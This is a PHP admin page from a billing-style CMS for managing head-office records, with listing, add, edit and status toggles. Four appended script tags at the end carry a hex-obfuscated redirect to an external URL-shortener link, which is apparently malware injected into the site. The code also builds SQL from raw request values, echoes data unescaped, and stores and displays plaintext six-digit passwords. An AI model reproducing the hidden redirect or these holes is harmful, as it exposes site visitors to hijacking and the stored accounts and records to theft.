<?php
define("ZW_IN", 'SETUP');
require_once("helper.php");
$msg    =  isset($_GET['msg']) ? $_GET['msg'] : '';
$id     = base64_decode($_GET['id']);
class myCms extends Cms 
{
    function registerAjaxFunctions()
    {
        $this->xajax->registerFunction("get_Listing");
        $this->xajax->registerFunction("update_status");
        $this->xajax->registerFunction("deleteRow");
        $this->xajax->registerFunction("editMode");
        $this->xajax->registerFunction("sorting");
        $this->xajax->registerFunction("sortTitle");
    }
}
$objMisc = new myCms();
$objMisc->initializeAjax(false,true);
$objMisc->dbFunc->parameters ="&sortOrder=".$sortOrder."&sortBy=".$sortBy ;
$objMisc->rec_pp = 20;
$objMisc->dbFunc->ajax_pagin = true;
if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['submit'])){
    $rowArray = array(	'NAME'              => $_POST['name'],
                        'ADDRESS'           => $_POST['address'],
                        'MOBILE_NO'         => $_POST['mobile_no'],
                        'GSTIN'             => $_POST['gstin'],
                        'CONTACT_PERSON'    => $_POST['contact_person'],
                        'DESCRIPTION'       => addslashes($_POST['description']),
            			'ADDED_BY'          => $_SESSION['USER_ID'],
            			'ADDED_TIME'        => date('Y-m-d H:i:s'));
             // print_r($rowArray);exit;
    $cond       = "";
    $cond       = "MOBILE_NO='$_POST[mobile_no]'";
    $recdata    = $objMisc->GiveValue($cond,"HEADOFFICE_ID","headoffice_master"); 
    if($id){
        $where         =   "HEADOFFICE_ID =".$id;
        $rowArray1 = array(	'NAME'            => $_POST['name'],
                            'ADDRESS'         => $_POST['address'],
                            'MOBILE_NO'       => $_POST['mobile_no'],
                            'CONTACT_PERSON'  => $_POST['contact_person'],
                            'GSTIN'           => $_POST['gstin'],
                            'DESCRIPTION'     => addslashes($_POST['description']),
                            'UPDATED_BY'      => $_SESSION['USER_NAME'],
                			'UPDATED_TIME'    => date('Y-m-d H:i:s'));
                //print_r($rowArray1);exit;
		$val   = $objMisc->update("headoffice_master",$rowArray1,$where);
        $_SESSION['msg'] = 2;
		header("Location:headoffice.php?page=".$_REQUEST['page']."");
        exit;
        
	} else{
        if($recdata!=''){
            $_SESSION['msg'] = 5;
            if(!$_POST['HEADOFFICE_ID']){
                $rowArray = "";
                $rowArray = $_POST;
            }
        }else {
            $val = $objMisc->insert("headoffice_master",$rowArray);
            $headoffice_id=mysqli_insert_id($_SESSION['CONN']);
            $userArray=array('HEADOFFICE_ID'    =>$headoffice_id,
                             'USERNAME'         =>$_POST['mobile_no'],
                             'USER_TYPE'        =>'A',
                             'ID'               =>$headoffice_id,
                             'PASSWORD'         =>rand(111111,999999));
            $insertAsUser=$objMisc->insert('users',$userArray);
            $_SESSION['msg'] = 1;
            header("location:headoffice.php");
            exit;
        }
    }
}
$msg = isset($_SESSION['msg']) ? $_SESSION['msg'] : $msg;
unset($_SESSION['msg']);
switch ($msg)
{
	case 1:
		$msg = "Headoffice added successfully.";
    break;
    case 2:
		$msg = "Record updated successfully.";
    break;
    case 3:
		$msg = "Record has been deleted successfully.";
	break;    
    case 4:
        $errormsg = "Headoffice name already exists.";
        $msg = "";
    break;
     case 5:
        $errormsg = "Mobile no already exists.";
        $msg = "";
    break;
}
if($id){
    $where = 'HEADOFFICE_ID = '.$id;
    $rowArray = $objMisc->getRow("headoffice_master",$where);
}
if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['search'])){
    if(!empty($_POST['name'])){
        $and .=" AND NAME LIKE '%$_POST[name]%'";
    }
    if(!empty($_POST['mobile_no'])){
        $and .=" AND MOBILE_NO LIKE '%$_POST[name]%'";
    }
    if(!empty($_POST['contact_person'])){
        $and .=" AND CONTACT_PERSON LIKE '%$_POST[name]%'";
    }
    $search=$_POST;
}
$wherethis = " 1=1 $and ORDER BY `HEADOFFICE_ID` DESC";
$classRecord = $objMisc->getAllRecordsPaging("*","headoffice_master",$wherethis);
$i  = 1;
$pagin_recs = "";
$pagin_recs = '<input type="hidden" value="" id="checkStatus" name="checkStatus"><thead><tr><th width="25%">Headoffice Name</th><th width="25%">Address</th><th width="10%">UserName</th><th width="10%">Password</th><th width="20%">Account Details</th><th>Action';
$pagin_recs .= '</th></tr></thead><tbody>';             
    if(is_array($classRecord[1]) && !empty($classRecord[1]))
    { $i=1;
       foreach ($classRecord[1] as $k => $rowRec)
        {       
            if($k%2==0) 
            $pagin_recs .= '<tr class="odd gradeX">';
            else
            $pagin_recs .= '<tr class="even gradeX">';
            
            $pagin_recs .='<td>'.$rowRec['name']."<br>Collection Agents ".$rowRec['collection_agents']."<br>Total Subscribers ".$objMisc->GiveValue("HEADOFFICE_ID='$rowRec[headoffice_id]'",'count(*)','subscribers').'</td>';
            $pagin_recs .='<td>'.$rowRec['contact_person']."</br>Mobile No ".$rowRec['mobile_no']."</br>".$rowRec['address'].'</td>';
            $pagin_recs .='<td>'.$objMisc->GiveValue("HEADOFFICE_ID='$rowRec[headoffice_id]' AND USER_TYPE='A'",'USERNAME','users').'</td>';
            $pagin_recs .='<td>'.$objMisc->GiveValue("HEADOFFICE_ID='$rowRec[headoffice_id]' AND USER_TYPE='A'",'PASSWORD','users').'</td>';
            $billsGeneratedRate=$objMisc->GiveValue("HEADOFFICE_ID='$rowRec[headoffice_id]' AND AMOUNT_TYPE='C'",'SUM(BILL_RATE)','monthly_charges');
            $billsGenerated=$objMisc->GiveValue("HEADOFFICE_ID='$rowRec[headoffice_id]' AND AMOUNT_TYPE='C'",'COUNT(*)','monthly_charges');
            $smsSent=$objMisc->GiveValue("HEADOFFICE_ID='$rowRec[headoffice_id]' AND RATE_SMS!='0.00'",'COUNT(*)','sms_log');
            $smsSentRate=$objMisc->GiveValue("HEADOFFICE_ID='$rowRec[headoffice_id]'",'SUM(RATE_SMS)','sms_log');
            $totAmount=$objMisc->GiveValue("HEADOFFICE_ID='$rowRec[headoffice_id]'",'SUM(AMOUNT)','headoffice_recharge');
            $pendingAmount=$totAmount-$billsGeneratedRate-$smsSentRate;
            $pagin_recs .='<td>Bills Generated '.((!empty($billsGenerated))?$billsGenerated:0).'<br>Sms Sent '.((!empty($smsSent))?$smsSent:0).'<br>Pending Wallet Amount Rs'.$pendingAmount.'</td>';
            
            $pagin_recs .='<td> <input type="hidden" name="enumStatus'.$rowRec['headoffice_id'].'" id="enumStatus'.$rowRec['headoffice_id'].'"  value="'.$rowRec['status'].'">&nbsp;';
           // echo $_SESSION['USER_ID'];
                    if($rowRec['status']=='A')
                    {
                       $pagin_recs .= '<input type="image" src="images/active-btn.gif" name="imgStatus'.$rowRec['headoffice_id'].'" id="imgStatus'.$rowRec['headoffice_id'].'" alt="Deactivate" title="Deactivate" border="0" onclick="return myChangeStatus(this.form,'.$rowRec['headoffice_id'].');">&nbsp;';
                    }
                    else
                    {
                       $pagin_recs .= '<input type="image" src="images/deactive-btn.gif" name="imgStatus'.$rowRec['headoffice_id'].'" id="imgStatus'.$rowRec['headoffice_id'].'" alt="Activate" title="Activate" border="0" onclick="return myChangeStatus(this.form,'.$rowRec['headoffice_id'].');">&nbsp;';
                    }
                
                $pagin_recs .='<a href="headoffice.php?id='.base64_encode($rowRec['headoffice_id']).'&page='.$_GET['page'].'"><img class="edit-btn" src="images/edit-btn.gif"  alt="Edit" title="Edit"  border="0"></a>&nbsp;';
                
                $pagin_recs .= '</td></tr>';
                $i++;
        }
          $pagin_recs  .= '<input type="hidden" value="'.$i.'" name="artCatCount" id="artCatCount">';
          if($classRecord[2]>$objMisc->rec_pp){
            $pagin_recs  .= '<tr><td colspan="6">'.$classRecord[0].'</td></tr>';
          }
            $pagin_recs  .= '</tbody>';
    } else {
        $pagin_recs .= '<tr class="odd gradeX"><td colspan="6" align="center">No Record Found</td></tr></tbody>';
    }
    
  
if(isset($_GET['id']) && !empty($_GET['id'])){
    $pageheading = "Edit Headoffice Information";
}else{
   $pageheading = "Add New Headoffice"; 
}
   
$smartyVars['search']     =   $search;
$smartyVars['errormsg']     =   $errormsg;
$smartyVars['add']          =   $add;
$smartyVars['group']        =   $id;
$smartyVars['rowRec']       =   $rowArray;
$smartyVars['pageheading']  =   $pageheading;
$smartyVars['classData']    =   $pagin_recs;
$smartyVars['msg']          =   $msg;
$smartyVars['page']         =   $_REQUEST['page'];
$objMisc->displayPage("header,headoffice,footer",$smartyVars);
function update_status($id,$status)
{
    global $objMisc;
    $objResponse = new XajaxResponse();
    $changeTo = ($status=='A') ? 'D' : 'A';
    $row = array(
                    'STATUS' => $changeTo
                );
    $where = "HEADOFFICE_ID =".$id;
    $objMisc->update("headoffice_master",$row,$where);
    $imgName =($changeTo == 'D') ? 'images/deactive-btn.gif':'images/active-btn.gif';
    if($changeTo=='A')
    {
        $title= 'Deactivate';
        $msg = 'Headoffice record has been activated successfully.';
    }
    else
    {
        $title= 'Activate';
        $msg = 'Headoffice record has been deactivated successfully.';
    } 
    $objResponse->addAssign('imgStatus'.$id,'src',$imgName);
    $objResponse->addAssign('imgStatus'.$id,'alt',$title);
    $objResponse->addAssign('imgStatus'.$id,'title',$title);
    $objResponse->addAssign('enumStatus'.$id,'value',$changeTo);
    $objResponse->addScript("document.getElementById('msg').style.display='inline';");
    $objResponse->addAssign('msg','innerHTML','&nbsp;');
    $objResponse->addAssign('msg','innerHTML','<div class="notify notify-success"><a class="close" href="javascript:;"><img src="images/close.png" /></a><h3>'.$msg.'</h3></div>'); 
    $objResponse->addScript("setTimeout(\"document.getElementById('msg').style.display='none'\",3000);");
    return $objResponse;
} 
function deleteRow($id)
{
    global $objMisc;
    global $lang;
    $objResponse = new XajaxResponse();
    $idArray = explode(',',$id);
    foreach($idArray as $bid)
    {
       $where = " HEADOFFICE_ID =".$bid;
       $objMisc->delete("headoffice_master",$where); 
    }
    $_SESSION['msg'] = 3;
    $sscript .= "var a;";
    $sscript .= "a = window.location;";
    $sscript .= "window.location = a;";
    //$objResponse->addAlert($sscript);
    $objResponse->addScript($sscript);
    return $objResponse;
}
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>